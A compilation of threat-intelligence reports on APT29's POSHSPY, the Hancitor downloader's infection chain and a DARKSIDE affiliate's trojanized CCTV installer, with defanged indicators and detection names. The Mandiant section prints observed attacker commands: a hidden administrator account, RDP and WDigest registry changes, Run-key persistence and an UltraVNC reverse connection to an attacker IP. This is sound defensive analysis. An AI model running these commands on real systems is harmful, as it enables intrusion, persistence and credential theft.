Infrequent beaconing, use of DGA and compromised infrastructure for C2, and appended file headers used to bypass content inspection made this backdoor difficult to identify using typical network monitoring techniques. 
Conclusion POSHSPY is an excellent example of the skill and craftiness of APT29.
By “living off the land” they were able to make an extremely discrete backdoor that they can deploy alongside their more conventional and noisier backdoor families, in order to help ensure persistence even after remediation.
As stealthy as POSHSPY can be, it comes to light quickly if you know where to look.
Enabling and monitoring enhanced PowerShell logging can capture malicious code as it executes and legitimate WMI persistence is so rare that malicious persistence quickly stands out when enumerating it across an environment.
This is one of several sneaky backdoor families that we have identified, including an off-the-shelf domain fronting backdoor and HAMMERTOSS. 
When responding to an APT29 breach, it is vital to increase visibility, fully scope the incident before responding and thoroughly analyze accessed systems that don't contain known malware. 
Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment. 
This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics. 
This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations. 
The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence. 
title: Hancitor Infection Chain Analysis: An Examination of its Unpacking Routine and Execution Techniques url: https://threatresearch.ext.hp.com/hancitors-return-analyzing-its-latest-infection-chain/ In this article, we describe how Hancitor compromises systems based on its infection chain observed in January and February 2021.
We cover its unpacking routine, information gathering and command and control (C2) functions, and payload execution techniques. 
The malware Hancitor Hancitor (aka Chanitor) is a downloader which is used to gain initial access to a victim’s computer.
Its main purpose is to download and execute a second stage malware payload from one of multiple encrypted URLs contained in the malware itself.
This downloader was first seen in 2014 commonly deploying Pony and Vawtrak malware.
Like many other malware families we saw Hancitor become active again in early 2021 following the festive period.
The first Hancitor malicious spam wave of 2021 started on 12 January, where the malware was distributed as email Word document attachments.
Since then, almost every workday we have seen Hancitor activity. 
Word Dropper used by Hancitor On Tuesday 12 January, phishing emails with hyperlinks leading to Word documents reached users’ inboxes.
The Word documents were droppers that install and execute the Hancitor downloader.
When opened, the user sees a social engineering image telling them that they must click the “Enable editing” button to see the document’s contents. 
Figure 1 – Word document lure requesting the user to run the VBA macro. 
Analyzing the attachment using oledump shows that not only VBA macros but also an Object Linking and Embedding (OLE) object are embedded in the document.
To find out how the OLE object is used and how the malware infection happens, we analyzed the VBA macros using Word’s developer tools. Figure 2 – Output from oledump showing the VBA macro in the Word document. 
The VBA code is distributed over several different modules inside the document and is executed by the Document.
Open event.
The OLE object is then saved with a “.tmp” file extension into one of the local temp folders under “C:\Users\[username]\AppData\Local\Temp”.
As the VBA code does not know where the file was stored, it then recursively searches through all local temp folders. 
Figure 3 – VBA macro which moves the tmp file to the templates folder as a DLL. 
Once the “.tmp” file is found, it is moved and renamed to the Office templates folder (C:\Users\username\AppData\Roaming\Microsoft\Templates) as “W0rd.dll” and loaded using rundll32.exe.
As a second argument, the macro passes the entry function “DllUnregisterServer” to rundll32.exe so that the execution starts correctly. 
Figure 4 – VBA macro which runs rundll32.exe to load the malware. 
Packed DLL analysis Briefly looking at the DLL characteristics shows that there are two unknown sections, which could be an indicator of packing being used to obfuscate the malware.
Opening the DLL in a debugger and running through the program, focusing on what is happening with the suspicious sections confirms that there is indeed some sort of unpacking happening. 
Figure 5 – Sections of the PE file (“W0rd.dll”). 
Although the unpacking procedure happens in multiple steps, it can be described in two broad stages: Decryption Stage 1 First, the malware allocates new memory which is used to copy the data from section “.rdata4” into it.
The data, however, is not copied identically from the section to the new memory region because the bytes containing 0x21 are omitted.
As soon as the copy operation is finished, the decryption process starts.
The first four bytes at the beginning of the newly allocated memory indicate the length of the data that will be decrypted.
The algorithm to decrypt the data is simple.
It uses an XOR operation with the key and plaintext being incremented after each four-byte operation.
To start, the key is initialized with 0xD508.
A replication of this algorithm, written in Python, can be found in our GitHub repository. 
Figure 6 – Data view of the section containing the encrypted malware. 
Looking at the decrypted data and the behavior of the program, we can see that there are multiple areas containing different types of information.
The names of Windows API functions are stored in the first 150 bytes.
The area after this contains encrypted data.
Finally, the executable code used to decrypt the encrypted data is located at the end of the section.
Figure 7 shows the structure of the memory section. 
Figure 7 – Structure of the encrypted section. 
The API function located at the beginning of the memory section are resolved using GetProcAddress.
However, instead of being resolved within kernel32.dll, they are resolved in kernelbase.dll.
This is important to note because when debugging Hancitor samples, breakpoints are most commonly set on functions from kernel32.dll and thus would not be triggered during execution.
After resolving the functions, the second decryption stage occurs. 
Decryption Stage 2 As indicated
, the decrypted memory structure contains executable code.
As expected, the instruction pointer jumps directly to this section, which also contains the decryption algorithm for the second stage.
Before the decryption starts, new memory is allocated and the encrypted data from stage 1 is copied to it.
The decryption algorithm of stage 2 is generally the same, but uses 0x3E9 as the initialization key.
The output of this decryption leads us to a PE file. 
Figure 8 – Overview of Hancitor’s decryption procedure. 
The copy procedure is done section by section to bring the executable into the loaded form.
This technique is called self-injection or PE overwrite.
To make the new image runnable, several Windows API functions are resolved using GetProcAddress and directly patched into the memory of the loaded executable.
These function addresses vary from installation to installation, so this patching cannot be done by a static unpacker.
For all the other decryption procedures described, you can find a static unpacker script in our GitHub repository.
To effectively run the new payload, a return to the correct DLL entry point is made.
It is important to note that the AddressOfEntryPoint in the optional header does not match the exported functions DllRegisterServer or DllUnregisterServer and it is necessary to run one of the exported functions to start the malware.
When using x32dbg to analyze the sample, simply patching the AddressOfEntryPoint to one of the exported functions makes the DLL runnable. 
Running Hancitor Malware As soon as the unpacked executable is running, the malware gathers information about the infected system.
The following disassembly shows calls to multiple functions used to collect the information. 
Figure 9 – x86 disassembly of Hancitor’s information gathering function. 
First, the malware calls a function we named “getComputerInfo”.
This function obtains the username, the computer name and the domain of infected system.
The subsequent functions collect additional information such as the machine’s public IP address, domain trust information and the computer architecture.
The malware identifies the computer’s public IP address by making a HTTP GET request to “hxxp://api.ipify[.]org”, a free public IP address API.
All the collected information is then put together into a query string which is generated based on the computer architecture. 
Figure 10 – Query string containing system information before being sent to the C2. 
To determine the command and control (C2) servers waiting for the data to be sent to, the malware calls a decryption function that uses the RC4 algorithm to get a list of potential C2 URLs. 
Figure 11 – URL and build decryption function. 
After successfully decrypting the C2 URLs, the data is sent there using a HTTP POST request adding the constructed query string as data.
To increase the probability of reaching an active server, the malware iterates over all the decrypted C2 URLs and tries to reach all of them until one of them sends a response. 
Figure 12 – C2 communication function. 
We assume that based on the received data the C2 server responds with either a simple string which can be decrypted to an active malware download server or with garbage data in the form of a simple string.
Although the decoding algorithm of the C2 response looks quite complex, it is actually Base64 decoding, followed by an XOR operation using the key 0x7A.
If the decryption leads to a valid URL, the malware initiates a download, which delivers an executable.
To execute the binary, Hancitor uses one of the following techniques: Create Process Create Thread Process Hollowing Thread Execution Hijacking Create Process If the method “Create Process” is chosen, then the malware writes the retrieved executable to disk into the temp folder and executes it using rundll32.exe with “start” as the argument for the entry function. 
Create Thread The Create Thread method is as straightforward as Create Process.
The malware simply allocates some memory, writes the malware into it and creates a new thread from it. 
Process Hollowing If the Process Hollowing method is used, a new svchost.exe process is created in a suspended state.
The malware then allocates new memory in the newly-created process, writes the executable to it and executes it in a new thread. 
Figure 13 – Process creation function. 
Thread Execution Hijacking The final execution method Hancitor supports is Thread Execution Hijacking.
This method is mostly the same as the above described Process Injection method.
The only difference is that the malware replaces the thread context with the downloaded executable and resumes it afterwards. 
Conclusion This article should give a good overview of Hancitor’s capabilities and behavior as of February 2021. Indicators of Compromise (IOCs) 
A list of IOCs is also available in the HP Threat Research GitHub repository. 
Hancitor Word documents: 111a2dc96e082b86a79dd90ec307c977a21c7aee0ddb141d688a17bd65f3661d 40c3eb22a02601cf70a4ae08eeaa5805144386bc13882e5f110c133b1d0ede8e 678da85cecff2cdda8559281dfc8a89f87c44c6371cbda4de4bc9ea5cd2f5cf9 772c897ffdfb824b31d70ea360224714ab9bb83659bd431897cc74dd2defc2f3 080bade36015dd79925bab0975ac0f30f18424bdd1e7836d63c2dee350bdbd69 22043734ed3f774db7a88297286f6ecd56336d755cc19f1bd54f2a2ac58982cd 2ac3b573d70c40c5c0fafe4e5914c723f2322a1c9cd76d232447654604ff8b76 385425e94ed8ac21d7888550743b7a2b89afbeb51341713adb6da89cd63b5aff 3ffe9ef810d01e9f242558ba59e8c7483adb72e087132cb0fd1e55171c45690f 51dd023b55be138ac7cfe7379a55c0a2a46c01cd3b3f96a151b0a27ed9e12485 56f1795abf78f798a51b9224a5deb17aedd924629136832b526c93339f525e56 6cd76e8f33a945b51d20b909495bbc613f78151dbea6c3a7a3a235bfd2167cdf 7b013a271432cc9dea449ea9fcf727ed3caf7ce4cc6a9ba014b3dd880b5668dd 8bcf45c2de07f322b8efb959e3cef38fb9983fdb8b932c527321fd3db5e444c8 99b98b8c7033456ba7840ad99c65347a8026aee62bccbbac6d22ca4b0f5dfa1e a1ec1a483f549af7e6f26ffe8b2c2ef6ac8c8f0d99349350c1df5eaa327f1ed3 b1502cdbb5aeee57d0a5d38945c64855ba35c25d43a71bd72c3cf31665e5aa62 cab2a47456a2c51504a79ff24116a4db3800b099ec50d0ebea20c2c77739276d d6755718c70e20345c85d18c5411b67c99da5b2f8740d63221038c1d35ccc0b8 ed3fa9e193f75e97c02c48f5c7377ff7a76b827082fdbfb9d6803e1f7bd633ca Extracted OLE Object (DLLs): Ce2449b7f600b0317614419159e9364e1a76613ac0cb112c88be171638573049 0941090d3eb785dbf88fbfafffad34c4ab42877b279129616a455347883e5738 6caccc64a9db7cfce75076ad273d85d108f5b764fcbbb865fd27c91f86cccfad c5385df4db1e69b06cf36f4481365d1101679a5764d721e369ea1d5d4c4b6b2c 288fdf9c64da0251107df7f1c3283f328279ad581710a9cf71f67e53b0b1684d c3e06473c4c3d801c962e6c90ccbcab3d532fb5a6649077ea09cd989edf45eaf cdcd5ee8b80d3a3863e0c55d4af5384522144011b071d00c9c71ae009305f130 43690eaf47245d69f4bda877c562852e4a9715955c2160345cb6cc84b18ca907 00b2312dd63960434d09962ad3e3e7203374421b687658bd3c02f194b172bfe3 372da9447db4ca966a6a9fd45f12519637a562953a88b6d92fb26d3699c14799 878319795a84ebfe5122d6fc21d27b4b94b3c28ad66679f841dec28ccc05e801 82c9bc479ea92c1900422666792877e00256996ce2f931984115598ed2c26f23 edabef17fce2aaca61dbd17a57baf780cd82a2b0189b0cf3c5a7a3ca07e94a44 Unpacked Hancitor (without patched function addresses): 1c55c9e30e3e2a4837afd80e6fc75518494af379835f4b2a7f0eaf815d697951 419fda1fec9e44d7988ceeb9c5742a09198e6fa7f213c23b7c064e56cbd50b40 C2 URLs: hxxp://requirend[.]com/8/forum.php hxxp://spabyasiande[.]ru/8/forum.php hxxp://conlymorect[.]ru/8/forum.php hxxp://fruciand[.]com/8/forum.php hxxp://forticheire[.]ru/8/forum.php hxxp://nentrivend[.]ru/8/forum.php hxxp://cloolyepervir[.]com/8/forum.php hxxp://areentthrices[.]ru/8/forum.php hxxp://syleclisizame[.]ru/8/forum.php Build IDs: 1301_dsf7823 1101_jh372 2001_6tc3ers Malware download URLs: hxxp://anabolicsteroidsbuy[.]info/nedfr.exe The post Hancitor Infection Chain Analysis: An Examination of its Unpacking Routine and Execution Techniques appeared first on HP Wolf Security. 
title: Smoking Out a DARKSIDE Affiliate’s Supply Chain Software Compromise url: https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html Mandiant observed DARKSIDE affiliate UNC2465 accessing at least one victim through a Trojanized software installer downloaded from a legitimate website.
While this victim organization detected the intrusion, engaged Mandiant for incident response, and avoided ransomware, others may be at risk. 
As reported in the Mandiant post, "Shining a Light on DARKSIDE Ransomware Operations," Mandiant Consulting has investigated intrusions involving several DARKSIDE affiliates.
UNC2465 is one of those DARKSIDE affiliates that Mandiant believes has been active since at least March 2020. 
The intrusion that is detailed in this post began on May 18, 2021, which occurred days after the publicly reported shutdown of the overall DARKSIDE program (Mandiant Advantage background).
While no ransomware was observed here, Mandiant believes that affiliate groups that have conducted DARKSIDE intrusions may use multiple ransomware affiliate programs and can switch between them at will. 
Sometime in May 2021 or earlier, UNC2465 likely Trojanized two software install packages on a CCTV security camera provider website. 
Mandiant determined the installers were malicious in early June and notified the CCTV company of a potential website compromise, which may have allowed UNC2465 to replace legitimate downloads with the Trojanized ones. 
While Mandiant does not suspect many victims were compromised, this technique is being reported for broader awareness.
Software supply chain attacks can vary greatly in sophistication, from the recent FireEye-discovered SolarWinds attacks to attacks such as this targeting smaller providers.
A software supply chain attack allows a single intrusion to obtain the benefit of access to all of the organizations that run that victim company’s software; in this case, an installer, rather than the software itself, was modified by UNC2465. 
DARKSIDE RaaS In mid-May 2021, Mandiant observed multiple threat actors cite an announcement that appeared to be shared with DARKSIDE RaaS affiliates by the operators of the service.
This announcement stated that they lost access to their infrastructure, including their blog, payment, and content distribution network (CDN) servers, and would be closing their service.
The post cited law enforcement pressure and pressure from the United States for this decision. 
Multiple users on underground forums have since come forward claiming to be unpaid DARKSIDE affiliates, and in some cases privately provided evidence to forum administrators who confirmed that their claims were legitimate.
There are some actors who have speculated that the DARKSIDE operator’s decision to close could be an exit scam.
While we have not seen evidence suggesting that the operators of the DARKSIDE service have resumed operations, we anticipate that at least some of the former affiliates of the DARKSIDE service will likely identify different ransomware or malware offerings to use within their own operations. 
Notably, Mandiant has continued to observe a steady increase in the number of publicly named victims on ransomware shaming sites within the past month.
Despite the recent ban of ransomware-related posts within underground forums, threat actors can still leverage private chats and connections to identify ransomware services.
As one example, in mid-May 2021, the operator of the SODINOKIBI (aka REvil) RaaS indicated that multiple affiliates from other RaaS platforms that had shut down were switching to their service.
Based on the perceived profitability of these operations, it is almost certain that numerous threat actors will continue to conduct widespread ransomware operations for the foreseeable future. 
Background In June 2021, Mandiant Consulting was engaged to respond to an intrusion.
During analysis, Mandiant determined the initial vector was a trojanized security camera PVR installer from a legitimate website. 
Mandiant attributed the overall intrusion activity to DARKSIDE affiliate UNC2465 due to continued use of infrastructure and tooling since October 2020. 
On May 18, 2021, a user in the affected organization browsed to the Trojanized link and downloaded the ZIP.
Upon installing the software, a chain of downloads and scripts were executed, leading to SMOKEDHAM and later NGROK on the victim’s computer.
Additional malware use such as BEACON, and lateral movement also occurred.
Mandiant believes the Trojanized software was available from May 18, 2021, through June 8, 2021. 
Pivoting on the slightly modified, but benign, MSHTA.exe application in VirusTotal, Mandiant identified a second installer package with the MD5 hash, e9ed774517e129a170cdb856bd13e7e8 (SVStation_Win64-B1130.1.0.0.exe), from May 26, 2021, which also connects out the same URL as the Trojanized SmartPSS installer. 
Supply Chain Intrusion Cycle Figure 1: Intrusion cycle Phase 1: Trojanized Installer Download Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before. 
The downloaded file was extracted to C:\Users\[username]\Downloads\06212019-General-SMARTPSS-Win32-ChnEng-IS\General_SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023\SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe. 
Mandiant confirmed the user intended to download, install, and use the SmartPSS software.
Figure 2 shows an image of the download page used for SmartPSS software. 
Figure 2: SmartPSS download page Phase 2: Nullsoft Installer 
The installer executable is a Nullsoft installer that when executed wrote two files to C:\ProgramData\SMARTPSS-Win32_ChnEng_IS.
We were able to extract the malicious installer script and files for analysis using 7-Zip.
The relevant section of this installer script is shown below in Figure 3. Figure 3: Nullsoft installer script section The installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6).
The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.
The latter is launched with a command line URL executing the content. 
The smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown.
Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.
This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy.
Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4. Figure 4: CyberChef diff between MSHTA.exe and smartpss.exe Phase 3: Downloaded VBScript and PowerShell Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line. 
Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.
According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions. 
C:\PROGRAMDATA\SMARTPSS-Win32_ChnEng_IS\smartpss.exe hxxp://sdoc[.]xyz/ID-508260156241 The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory.
Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file. 
<html><head>..<script language='VBScript'>..
On Error Resume Next 
At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code.
It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant.
A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served. 
Figure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6. 
Figure 6: SMOKEDHAM downloader Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler. 
csc.exe /noconfig
/fullpaths @'C:\Users\ [username]\AppData\Local\Temp\qnxfhfim\qnxfhfim.cmdline' Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file. .../t
:library /utf8output /R:'System.dll' /R:'C:\windows\Microso 
After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM. 
Phase 4: SMOKEDHAM Dropper The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.
The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.
The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.
In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable. 
The SMOKEDHAM backdoor source code is embedded as an encrypted string.
The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.
After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.
The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.
Figure 7 shows the deobfuscated SMOKEDHAM dropper. 
Figure 7: SMOKEDHAM dropper Phase 5: SMOKEDHAM Backdoor SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.
The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server. 
SMOKEDHAM Network Communications SMOKEDHAM communicates with its C2 server using HTTPS.
The backdoor uses domain fronting to obfuscate its true C2 server.
The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.
Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication. 
The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.
The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.
The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data. 
The ID field contains a unique value generated by the backdoor for the target system. 
The UUID field may contain a unique value used to track command output or be empty.
When the C2 server responds with a command to execute, it sets the UUID field to a unique value.
SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output. 
The Data field may contain RC4-encrypted, Base64-encoded command data or be empty.
The backdoor uses the Data field to send command output to its C2 server.
The C2 server uses the Data field to send commands to the backdoor to execute.
The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.
Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption. 
SMOKEDHAM Commands SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.
The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1. Keyword Action delay Update its sleep interval screenshot Upload a screen capture to its C2 server via a subsequent HTTP POST request exit Terminate Table 1: Plaintext command data keywords If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.
The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request. 
In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.
The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests. 
SMOKEDHAM In Action SMOKEDHAM was observed executing commands on the target system using PowerShell. 
The following commands were used to collect information about the system and logged in users. 
net.exe user net.exe users whoami.exe whoami.exe /priv systeminfo.exe 
The following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen. 
net.exe user DefaultUser REDACTED /ADD net.exe localgroup Administrators DefaultUser /ADD reg.exe ADD 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' /v 
DefaultUser /t REG_DWORD /d
0 /f 
The following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication. 
reg.exe ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t
REG_DWORD /d 0 /f reg.exe ADD 'HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fSingleSessionPerUser /t
REG_DWORD /d 0 /f reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse /t
REG_DWORD /d
1 /f Additionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential to enable credential caching. 
Phase 6: Follow-on Activity SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8.
These files were saved to the %APPDATA%\Chrome\ directory.
The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1. 
Figure 8: Contents of UltraVNC.ini SMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions. 
%
APPDATA%\Chrome\winvnc.exe' -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 –run SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key. 
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ConhostNT /d
%appdata%\Chrome\winvnc.exe NGROK Configuration SMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml.
These files were stored in the C:\ProgramData\WindNT\ directory.
NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels. 
Figure 9 and Figure 10 show the contents of VirtualHost.vbs and ngrok.yml files, respectively. 
Figure 9: Contents of VirtualHost.vbs Figure 10: Contents of ngrok.yml The execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment. 
SMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key. 
reg.exe add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v WindNT /d
C:\ProgramData\WindNT\VirtualHost.vbs Keylogger Deployment This attacker utilized an additional keylogging utility named C:\ProgramData\psh\console.exe.
The keylogging utility was configured to capture and record keystrokes to C:\ProgramData\psh\System32Log.txt. 
Mandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility.
The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations: C:\Users\[username]\Start Menu\Programs\Startup\desktop.lnk 
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\desktop.lnk 
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\console.lnk Cobalt Strike Beacon The attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe. 
Update.exe was a Go based dropper created using the ScareCrow framework.
The attacker executed C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe using Command Prompt. 
cmd.exe /c 'C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe'&&exit 
The execution of ScareCrow framework dropper C:\ProgramData\Cisco Systems\Cisco Jabber\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\ProgramData\Cisco\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed. 
Mandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ directory.
Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload. 
LSASS Dumping and Lateral Movement Mandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.
DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\ProgramData\psh\ directory. 
From this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections. 
Conclusion UNC2465 established initial access via a Trojanized installer executed by an unsuspecting user.
UNC2465 interactively established an NGROK tunnel and began moving laterally in less than 24 hours.
Five days later, UNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and conducted credential harvesting via dumping LSASS memory. 
Ransomware groups continue to adapt and pursue opportunistic access to victims.
UNC2465’s move from drive-by attacks on website visitors or phishing emails to this software supply chain attack shows a concerning shift that presents new challenges for detection.
While many organizations are now focusing more on perimeter defenses and two-factor authentication after recent public examples of password reuse or VPN appliance exploitation, monitoring on endpoints is often overlooked or left to traditional antivirus.
A well-rounded security program is essential to mitigate risk from sophisticated groups such as UNC2465 as they continue to adapt to a changing security landscape. 
Indicators Supply Chain/Trojanized Nullsoft Installer/SmartPSS MD5:
1430291f2db13c3d94181ada91681408 Filename: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe Zip MD5: 54e0a0d398314f330dfab6cd55d95f38 Supply Chain/Trojanized Nullsoft Installer/SVStation MD5: e9ed774517e129a170cdb856bd13e7e8 Filename: SVStation_Win64-B1130.1.0.0.exe Intermediate Stage URL: hxxp://sdoc[.]xyz/ID-508260156241 IP: 185.92.151[.]150 SMOKEDHAM LOADER MD5: f075c2894ac84df4805e8ccf6491a4f4 (Gbdh7yghJgbj3bb.html) MD5: 05d38c7e957092f7d0ebfc7bf1eb5365 SMOKEDHAM MD5: 127bf1d43313736c52172f8dc6513f56 (in-memory from f075c2894ac84df4805e8ccf6491a4f4)
Host: max-ghoster1.azureedge[.]net (actual C2) MD5: 9de326bf37270776b78e30d442bda48b (MEtNOcyfkXWe.html) Host: atlant20.azureedge[.]net (actual C2) MD5: b06319542cab55346776f0358a61b3b3 (in-memory from 05d38c7e957092f7d0ebfc7bf1eb5365)
Host: skolibri13.azureedge[.]net (actual C2) NGROK MD5: e3bc4dd84f7a24f24d790cc289e0a10f (legitimate NGROK renamed to conhost.exe) MD5: 84ed6012ec62b0bddcd18058a8ff7ddd (VirtualHost.vbs) UltraVNC IP/Port: 81.91.177[.]54:7234 (using legitimate ULTRAVNC 23b89bf2c2b99fbc1e232b4f86af65f4) BEACON Host: w2doger[.]xyz IP: 185.231.68.102 MD5: a9fa3eba3f644ba352462b904dfbcc1a (shellcode) 
Detecting the Techniques FireEye detects this activity across our platforms.
The following contains specific detection names that provide indicators associated with this activity. 
Platform Detection Name FireEye Network Security FireEye Email Security FireEye Detection On Demand FireEye Malware Analysis FireEye Malware File Protect Backdoor.
BEACON FE_Loader_Win32_BLUESPINE_1 Trojan.
Win32.CobaltStrike Backdoor.
MSIL.SMOKEDHAM Malware.
Binary.ps1 FEC_Backdoor_CS_SMOKEDHAM_1 Suspicious Process PowerShell Activity FireEye Endpoint Security Real-Time Detection (IOC) WDIGEST CREDENTIAL EXPOSURE (METHODOLOGY) WDIGEST CREDENTIAL EXPOSURE VIA REGISTRY (METHODOLOGY) SUSPICIOUS CONHOST.EXE A (METHODOLOGY) TASKMGR PROCESS DUMP OF LSASS.EXE
A (METHODOLOGY) Malware Protection (AV/MG) Trojan.GenericFCA.Script.533 Trojan.GenericFCA.Agent.7732 Dropped:Trojan.VBS.VGU Trojan.
CobaltStrike.
FM NGRok Ultra VNC SVN Station Generic.mg.a9fa3eba3f644ba3 Generic.mg.1626373508569884 Modules Process Guard (LSASS memory protection) FireEye Helix VNC METHODOLOGY
[Procs] (T1021.005) WINDOWS ANALYTICS
[Abnormal RDP Logon] (T1078) WINDOWS ANALYTICS
[Recon Commands] (T1204) WINDOWS METHODOLOGY
[Cleartext Credentials Enabled - UseLogonCredential] (T1003.001) WINDOWS METHODOLOGY
[LSASS Generic Dump Activity] (T1003.001) WINDOWS METHODOLOGY
[LSASS Memory Access] (T1003.001) WINDOWS METHODOLOGY
[Registry Run Key - reg.exe] (T1547.001) WINDOWS METHODOLOGY
[User Created - Net Command] (T1136.001) 
